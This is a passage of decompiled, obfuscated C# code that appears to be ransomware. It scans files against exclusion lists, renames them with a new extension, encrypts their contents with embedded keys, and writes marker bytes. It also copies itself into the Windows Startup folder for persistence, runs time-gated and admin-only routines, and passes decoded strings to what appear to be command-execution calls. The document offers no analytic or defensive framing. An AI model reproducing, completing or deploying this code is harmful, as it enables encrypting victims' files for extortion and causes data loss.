			if (((!CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(getString_0(107388962)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(getString_0(107388937)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(getString_0(107388904)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().Contains(getString_0(107388855)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().Contains(getString_0(107388874)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(getString_0(107388817)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(getString_0(107388284)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().Contains(getString_0(107388271)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().Contains(getString_0(107388290)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().Contains(getString_0(107388253)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().Contains(getString_0(107388212)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().Contains(getString_0(107388227)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().Contains(getString_0(107388201)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().Contains(getString_0(107388148))) || CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(XtEtTgUvwHGMW(getString_0(107388123)))) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(getString_0(107388082)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(getString_0(107388097)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(getString_0(107388048)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(getString_0(107388063)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(getString_0(107388526)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(getString_0(107388541)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(getString_0(107388524)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(getString_0(107388475)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(getString_0(107388462)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(getString_0(107388441)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().Contains(getString_0(107388460)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().Contains(getString_0(107388447)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().Contains(getString_0(107388398)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().Contains(getString_0(107388413)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(XtEtTgUvwHGMW(getString_0(107388396))) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(getString_0(107388339)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(getString_0(107388358)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(getString_0(107396381)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(getString_0(107388313)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.EndsWith(UfgTUBLEANxCD) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.EndsWith(getString_0(107388320)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.EndsWith(getString_0(107387771)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.EndsWith(getString_0(107387766)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.EndsWith(getString_0(107387761)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(getString_0(107387788)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(rwyuADDQdblNA) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(LImNkSPhwOOQHW) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(mqQgvSYgrlnpSvAge))
			{
				if (JzXWXIIovwkoW.Length != 0)
				{
					string[] jzXWXIIovwkoW = JzXWXIIovwkoW;
					int num = 0;
					while (num < jzXWXIIovwkoW.Length)
					{
						string value = jzXWXIIovwkoW[num];
						if (!CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_1055;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.EndsWith(UfgTUBLEANxCD))
					{
						goto IL_1055;
					}
				}
				catch (Exception)
				{
					goto IL_1055;
				}
				if (!lBBLtRfPsPV.Contains(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN))
				{
					if (mdbUrlsnzSwt == getString_0(107396877))
					{
						try
						{
							if (dHuTNVWgMqhChXsi.uwHkPSlbEdqzd(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN))
							{
								dHuTNVWgMqhChXsi.YaBImKBJBjtLtc(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
							}
						}
						catch
						{
						}
					}
					lBBLtRfPsPV.Add(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
					Thread thread = new Thread((ThreadStart)delegate
					{
						try
						{
							if (qqVKUcwYqRObMU)
							{
								Console.WriteLine(HLVtOJtcIkZeWP.getString_0(107412355) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + HLVtOJtcIkZeWP.getString_0(107412764) + new FileInfo(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN).Length + HLVtOJtcIkZeWP.getString_0(107412775));
								Console.WriteLine(HLVtOJtcIkZeWP.getString_0(107412362), lBBLtRfPsPV.Count, DnHtYVwZFeaR, gmdqiJfLiKSG);
								Console.WriteLine(HLVtOJtcIkZeWP.getString_0(107412305), UNPGQjVMpE.Elapsed);
								Console.WriteLine(HLVtOJtcIkZeWP.getString_0(107412734));
							}
						}
						catch
						{
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (!rEUVMKgscr.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN)))
					{
						rEUVMKgscr.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN));
					}
					BHcaTUPjYtf(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
					try
					{
						new dfEMPHnLgeI().KIkInStTZGC(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (qqVKUcwYqRObMU)
								{
									Console.WriteLine(getString_0(107412831) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + getString_0(107412754) + new FileInfo(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN).Length + getString_0(107412765));
									Console.WriteLine(getString_0(107412724));
								}
							}
							catch
							{
							}
							spDXxUcNpZnQ(XtEtTgUvwHGMW(getString_0(107412651)), getString_0(107387672) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + getString_0(107387672) + XtEtTgUvwHGMW(getString_0(107413106)) + getString_0(107387672) + Environment.UserName + getString_0(107387672) + XtEtTgUvwHGMW(getString_0(107413121)));
						}
					}
					catch (Exception ex2)
					{
						if (hIFJbdEMJudY)
						{
							try
							{
								File.AppendAllText(LImNkSPhwOOQHW, getString_0(107387444) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + getString_0(107413096) + ex2.Message + getString_0(107395828));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN).Length != 0L)
							{
								goto end_IL_089f;
							}
							goto end_IL_089e;
							end_IL_089f:;
						}
						catch (Exception ex2)
						{
							if (hIFJbdEMJudY)
							{
								try
								{
									File.AppendAllText(LImNkSPhwOOQHW, getString_0(107387444) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + getString_0(107412983) + ex2.Message + getString_0(107395828));
								}
								catch (Exception)
								{
								}
							}
							gmdqiJfLiKSG++;
							goto end_IL_089e;
						}
						if (ZTtOBFIFhDPJ == getString_0(107396877) && new FileInfo(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN).Length > Convert.ToInt32(ybUSgcGwjKebC) * 1024 * 1024)
						{
							try
							{
								if (UfgTUBLEANxCD != getString_0(107386677))
								{
									if (eSjMTjCatON)
									{
										UfgTUBLEANxCD = BBDxmQurRdVswG + UfgTUBLEANxCD;
									}
									File.Move(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + UfgTUBLEANxCD);
								}
							}
							catch (Exception ex2)
							{
								if (hIFJbdEMJudY)
								{
									try
									{
										File.AppendAllText(LImNkSPhwOOQHW, getString_0(107387444) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + getString_0(107412922) + ex2.Message + getString_0(107395828));
									}
									catch (Exception)
									{
									}
								}
								gmdqiJfLiKSG++;
								return;
							}
							if (UfgTUBLEANxCD != getString_0(107386677))
							{
								CS_0024_003C_003E8__locals0.ksJAkzHcZyIN += UfgTUBLEANxCD;
							}
							if (CMdYdSoRLCrMajhb == getString_0(107396877))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item in hHDzREQRrQkqjKe)
									{
										if (CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.tkdfLXnvtaLVtT.UfgTUBLEANxCD) && TQwKQbvIHjGUX == HLVtOJtcIkZeWP.getString_0(107396887))
										{
											if (Convert.ToInt32(wlgCZFnHvCei) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN).Length)
											{
												try
												{
													ySVDzMAbizHUS.FvMtDCdFtDGVbzA(HLVtOJtcIkZeWP.getString_0(107389227), HLVtOJtcIkZeWP.getString_0(107389190), HLVtOJtcIkZeWP.getString_0(107389177), CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().EndsWith(item) && TQwKQbvIHjGUX == HLVtOJtcIkZeWP.getString_0(107396710))
										{
											try
											{
												ySVDzMAbizHUS.FvMtDCdFtDGVbzA(HLVtOJtcIkZeWP.getString_0(107389227), HLVtOJtcIkZeWP.getString_0(107389190), HLVtOJtcIkZeWP.getString_0(107389177), CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
											}
											catch
											{
											}
										}
									}
								});
								thread2.IsBackground = false;
								thread2.Priority = ThreadPriority.Normal;
								thread2.Start();
							}
							byte[] bytes = Encoding.ASCII.GetBytes(jdzEbvPutazU);
							if (iHEcKVZxNihtAo == getString_0(107396700))
							{
								byte[] array = null;
								byte[] byte_ = zuVeojPvzZvsAuYXeg.eiVZeDjgvjzXx(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, Convert.ToInt32(ybUSgcGwjKebC) * 1024 * 1024);
								if (!zuVeojPvzZvsAuYXeg.efnMlvSzfC(RJbBOzKoWoPeh: (!OIyyeuNoRzhHTwe) ? (MFCrMNyVwftIF ? zuVeojPvzZvsAuYXeg.rhGTroEfaFqc(byte_, Convert.FromBase64String(kEFVKbULbQeU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : zuVeojPvzZvsAuYXeg.rhGTroEfaFqc(byte_, Convert.FromBase64String(kEFVKbULbQeU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (MFCrMNyVwftIF ? GGGzGnJbALqDB.ofyMhRiGkVjut(byte_, Convert.FromBase64String(kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu)) : GGGzGnJbALqDB.ofyMhRiGkVjut(byte_, Convert.FromBase64String(kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu))), CijILhJAqDGY: CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, opeYgyFjaEFL: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + UfgTUBLEANxCD, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!MFCrMNyVwftIF)
							{
								if (!WngNyaOwcSGdLP.MaLriMjWjsJEaP(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, ybUSgcGwjKebC, kEFVKbULbQeU, null, Convert.FromBase64String(HZePHYGbpexu)))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + UfgTUBLEANxCD, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!WngNyaOwcSGdLP.MaLriMjWjsJEaP(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, ybUSgcGwjKebC, kEFVKbULbQeU, bytes, Convert.FromBase64String(HZePHYGbpexu)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + UfgTUBLEANxCD, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (eSjMTjCatON)
							{
								UfgTUBLEANxCD = BBDxmQurRdVswG + UfgTUBLEANxCD;
							}
							byte[] bytes = Encoding.ASCII.GetBytes(jdzEbvPutazU);
							if (UfgTUBLEANxCD != getString_0(107386677))
							{
								if (!wRVzxmISkhBzKR)
								{
									if (!MFCrMNyVwftIF)
									{
										edWBraEVjZnwU(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + UfgTUBLEANxCD, cjnjoiIOwY);
									}
									else
									{
										edWBraEVjZnwU(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + UfgTUBLEANxCD, Convert.FromBase64String(kEFVKbULbQeU));
									}
								}
								else
								{
									try
									{
										if (!MFCrMNyVwftIF)
										{
											yWogjCIsHMw(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + UfgTUBLEANxCD, cjnjoiIOwY, Convert.FromBase64String(HZePHYGbpexu));
										}
										else
										{
											yWogjCIsHMw(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + UfgTUBLEANxCD, Convert.FromBase64String(kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu));
										}
									}
									catch (Exception ex2)
									{
										if (hIFJbdEMJudY)
										{
											try
											{
												File.AppendAllText(LImNkSPhwOOQHW, getString_0(107387444) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + getString_0(107386695) + ex2.Message + getString_0(107395828));
											}
											catch (Exception)
											{
											}
										}
										gmdqiJfLiKSG++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + UfgTUBLEANxCD, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!wRVzxmISkhBzKR)
							{
								if (!MFCrMNyVwftIF)
								{
									edWBraEVjZnwU(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + getString_0(107386672), cjnjoiIOwY);
								}
								else
								{
									edWBraEVjZnwU(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + getString_0(107386672), Convert.FromBase64String(kEFVKbULbQeU));
								}
							}
							else
							{
								try
								{
									if (!MFCrMNyVwftIF)
									{
										yWogjCIsHMw(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, cjnjoiIOwY, Convert.FromBase64String(HZePHYGbpexu));
									}
									else
									{
										yWogjCIsHMw(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, Convert.FromBase64String(kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu));
									}
								}
								catch (Exception ex2)
								{
									if (hIFJbdEMJudY)
									{
										try
										{
											File.AppendAllText(LImNkSPhwOOQHW, getString_0(107387444) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + getString_0(107386695) + ex2.Message + getString_0(107395828));
										}
										catch (Exception)
										{
										}
									}
									gmdqiJfLiKSG++;
									return;
								}
							}
							if (MFCrMNyVwftIF)
							{
								if (UfgTUBLEANxCD != getString_0(107386677))
								{
									oQVgdpANcfhNxO(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + UfgTUBLEANxCD, bytes);
								}
								else
								{
									oQVgdpANcfhNxO(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, bytes);
								}
							}
						}
						end_IL_089e:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_1055;
			IL_1055:
			XZRDbtNRlUBUa.Remove(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
		}

		static HbGtZiKmUw()
		{
			Strings.CreateGetStringDelegate(typeof(HbGtZiKmUw));
		}
	}

	private sealed class ewNiqrWpEUQhvJr
	{
		public string dFiPRFTAZdSvgLc;

		public string VBXkXxUgmNJw;

		public void _003CEncrypt2_003Eb__4b()
		{
			while (true)
			{
				try
				{
					File.Delete(dFiPRFTAZdSvgLc);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__4c()
		{
			while (true)
			{
				try
				{
					if (File.Exists(VBXkXxUgmNJw))
					{
						File.Delete(VBXkXxUgmNJw);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string AgnlixIASzPo;

	public static byte[] cjnjoiIOwY;

	public static string oLUeHhoXSrXL;

	public static string rqLFEsCDTMyF;

	public static List<string> qyAhWYLrtiOtS;

	public static List<string> ZptgORKOFpXG;

	public static string UyxzMyCitXGF;

	public static string kEFVKbULbQeU;

	public static string HZePHYGbpexu;

	public static string jdzEbvPutazU;

	public static string ZRDcpXUTjf;

	public static int mChCVJySpU;

	public static string mdbUrlsnzSwt;

	public static string WLuIVsIaUhiu;

	public static string HCpNwQtDwzNYscU;

	public static string GGlQFQXWCSTMex;

	public static string JEhiYMEqiJZdM;

	public static string IgkMrPNdoY;

	public static string NCTXVCAZAjOmyja;

	public static string xZEDYYkzZNtnw;

	public static List<string> LhumsKBCnHATf;

	public static List<string> rEUVMKgscr;

	public static string oMdDoqdvvo;

	public static string VIQnoauQMXDbY;

	public static string GMXxpLBEnImyJ;

	public static List<string> lBBLtRfPsPV;

	public static string MNBzqiuQfRJQcYj;

	private static string XgJEKIOOydLD;

	public static string mWfsjXfVaDjgsa;

	public static string ncZxFsAKDqAUKI;

	public static List<string> ChiDTlAoGQMI;

	public static List<string> qCvAdJfngnF;

	public static List<string> bruHyzeehnYYe;

	public static string ApqYNCacJvgq;

	public static List<string> hYLuEtEuxHyq;

	public static List<string> GYrkTbkHmlHWMo;

	public static string ZEmVnICIbBRUZQ;

	public static string UgaPTwgoRjIJ;

	internal static DateTime dcWTdhUfGduYB;

	internal static DateTime pIlCbMiwoka;

	public static string ZTtOBFIFhDPJ;

	public static string ybUSgcGwjKebC;

	public static string bfLHAxJfKaXqSS;

	public static string HOpZOfKRSkqrQ;

	public static string dzHgpDGlGW;

	public static string bMxANrWiPUcalcb;

	public static string NkvCSDGHDZ;

	public static string CMdYdSoRLCrMajhb;

	public static List<string> hHDzREQRrQkqjKe;

	public static string TQwKQbvIHjGUX;

	public static string wlgCZFnHvCei;

	public static string SGWNbaKnmA;

	public static string LMpNgFGShlT;

	public static string TTbEbSgDAnnJ;

	public static string FalYYrscvz;

	public static string vEIuBeySmAexSb;

	public static string wvVqxnBdrKxaCFZ;

	public static string kvwQzPxIqIlk;

	public static string VyRGExDcVMKv;

	public static string DsHDKKZPqyRV;

	public static string cldkFsbciuo;

	public static string jJkNZEReBTMkuY;

	public static string HVmQpJlElf;

	public static string oTOnJctkwlomjyOZ;

	public static string eRcopzfggFE;

	public static string TUGYFpvgdQx;

	public static string eKzyHsWGljk;

	public static string KMWeqbAyUYuGHH;

	public static string rwyuADDQdblNA;

	public static string OCCDMTBKtUqAz;

	public static string rWgzoQLgIQfGZ;

	public static string YWANRiRWiwxS;

	public static string ZOYchrvgjtkVKhh;

	public static string PvAuHyHwFZ;

	public static string IRCSlCXoMRFG;

	public static string iHEcKVZxNihtAo;

	public static string fFgPwmFliHHKe;

	public static string pdVkOWqmIAKIO;

	public static string[] yWgWMeznrQnK;

	public static string kcgyNtrPsiyuwV;

	public static bool OIyyeuNoRzhHTwe;

	public static string DMbGhzJPCMTj;

	public static bool MFCrMNyVwftIF;

	public static bool ryIZnDiEOid;

	public static bool EekjbAOphgGS;

	public static bool EMUmjShvoRjVxRTfB;

	public static string LImNkSPhwOOQHW;

	public static bool hIFJbdEMJudY;

	public static bool uJePXmmfyrV;

	public static bool QNcazMBOlHTTBH;

	public static bool WRwAKzNShnoL;

	public static bool wRVzxmISkhBzKR;

	public static string mqQgvSYgrlnpSvAge;

	public static bool qqVKUcwYqRObMU;

	public static Stopwatch UNPGQjVMpE;

	public static int gmdqiJfLiKSG;

	public static int DnHtYVwZFeaR;

	public static bool eSjMTjCatON;

	public static string BBDxmQurRdVswG;

	public static string[] CCiaOWbaRz;

	public static List<string> yDNKtVeuKTBPdF;

	public static int bcPffxszCs;

	public static bool DHzgvUPuaGcJ;

	public static bool ShkWUIXYoOWB;

	public static bool AbzhPXXcXCCr;

	public static bool fiNlreSRwIMD;

	public static bool IeiMhxonCbw;

	public static bool kXcVqGPhsGu;

	public static List<string> LprhUPIkKugxdZ;

	public static string fOCEhEMJTPme;

	public static bool CuCRTFRskQOdHM;

	public static byte[] FfXSrTItXwhd;

	public static byte[] VfmZCqDrTnYlT;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate15;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate17;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate18;

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	private static extern bool AllocConsole();

	[DllImport("kernel32.dll")]
	private static extern bool SetProcessShutdownParameters(uint uint_0, uint uint_1);

	private static void Main(string[] args)
	{
		Stopwatch stopwatch = new Stopwatch();
		stopwatch.Start();
		try
		{
			PpggCFgBmEOIDGcQN CS_0024_003C_003E8__locals0 = new PpggCFgBmEOIDGcQN();
			CS_0024_003C_003E8__locals0.IpRGqFaYhWFXiZxQ = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.IpRGqFaYhWFXiZxQ) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			ofeBOOgyQFL.FQKnVnTpJvqra(XgJEKIOOydLD);
		}
		catch (Exception)
		{
		}
		try
		{
			if (IRCSlCXoMRFG == getString_0(107396859))
			{
				Thread thread = new Thread(BTKuHKnalUw.DhnlDnKeDcVDg);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		SetProcessShutdownParameters(0u, 0u);
		if (HCpNwQtDwzNYscU == getString_0(107396859))
		{
			Thread.Sleep(int.Parse(GGlQFQXWCSTMex));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && NkvCSDGHDZ == getString_0(107396859))
		{
			try
			{
				SXgAmFCHFbhKk(XtEtTgUvwHGMW(WSyblavDtYINn(getString_0(107396886))));
			}
			catch
			{
			}
		}
		try
		{
			if (NCTXVCAZAjOmyja == getString_0(107396859) && bEGPhQgpUMj.xjzgRuZeDfO())
			{
				new HPiAcCbPNhYtgW().WMjshALAhNSD(bool_0: false);
				bEGPhQgpUMj.xgETwExpMTix();
			}
		}
		catch (Exception)
		{
		}
		if (VIQnoauQMXDbY == getString_0(107396859) && bEGPhQgpUMj.xjzgRuZeDfO())
		{
			new HPiAcCbPNhYtgW().WMjshALAhNSD(bool_0: false);
			new HPiAcCbPNhYtgW().BAXnzxBvlCrH();
		}
		if (WLuIVsIaUhiu == getString_0(107396859))
		{
			VGVdNepxNaT.aDaBTRMOqkVCEV();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396781);
			string text2 = text + Path.GetFileName(fileName);
			if (ZRDcpXUTjf == getString_0(107396859) && fileName != text2)
			{
				Thread thread2 = new Thread(GgtGCLfdMyde);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (UyxzMyCitXGF == getString_0(107396859) && mainModule != null && fileName != text2)
			{
				try
				{
					mChCVJySpU = ilvvDnPDEnGoFk(0, LhumsKBCnHATf.Count);
					File.Copy(fileName, text + LhumsKBCnHATf[mChCVJySpU], overwrite: true);
					getString_0(107396744);
					Process.Start(text + LhumsKBCnHATf[mChCVJySpU]);
					KlGYVRewNV();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (ZEmVnICIbBRUZQ == getString_0(107396859) && DateTime.Now < dcWTdhUfGduYB)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (UgaPTwgoRjIJ == getString_0(107396859) && DateTime.Now > pIlCbMiwoka)
			{
				KlGYVRewNV();
			}
		}
		catch
		{
		}
		try
		{
			AllocConsole();
			Console.Title = getString_0(107397022);
			if (jJkNZEReBTMkuY == getString_0(107396859))
			{
				Console.WriteLine(getString_0(107396404));
			}
			UNPGQjVMpE.Start();
		}
		catch
		{
		}
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate
			{
				List<string> chiDTlAoGQMI = ChiDTlAoGQMI;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
					{
						spDXxUcNpZnQ(XtEtTgUvwHGMW(getString_0(107386567)), string_0);
					};
				}
				Parallel.ForEach(chiDTlAoGQMI, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				List<string> source3 = qCvAdJfngnF;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
					{
						spDXxUcNpZnQ(XtEtTgUvwHGMW(getString_0(107386586)), string_0);
					};
				}
				Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
				if (pdVkOWqmIAKIO == getString_0(107396859))
				{
					string[] source4 = yWgWMeznrQnK;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
						{
							spDXxUcNpZnQ(XtEtTgUvwHGMW(getString_0(107386586)), getString_0(107386529) + string_0 + getString_0(107386552));
						};
					}
					Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
				}
				if (!KDRBaizPAVVdHDL().Contains(getString_0(107388600)))
				{
					try
					{
						DxkPRjlZwqzF(ApqYNCacJvgq);
					}
					catch (Exception)
					{
					}
					List<string> source5 = bruHyzeehnYYe;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
						{
							spDXxUcNpZnQ(XtEtTgUvwHGMW(WSyblavDtYINn(getString_0(107386592))), string_0);
						};
					}
					Parallel.ForEach(source5, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
				}
				else
				{
					List<string> source6 = bruHyzeehnYYe;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
						{
							spDXxUcNpZnQ(XtEtTgUvwHGMW(WSyblavDtYINn(getString_0(107386592))), string_0);
						};
					}
					Parallel.ForEach(source6, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
				}
				List<string> source7 = hYLuEtEuxHyq;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate18 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate18 = delegate(string string_0)
					{
						spDXxUcNpZnQ(XtEtTgUvwHGMW(getString_0(107386547)), string_0);
					};
				}
				Parallel.ForEach(source7, CS_0024_003C_003E9__CachedAnonymousMethodDelegate18);
			};
		}
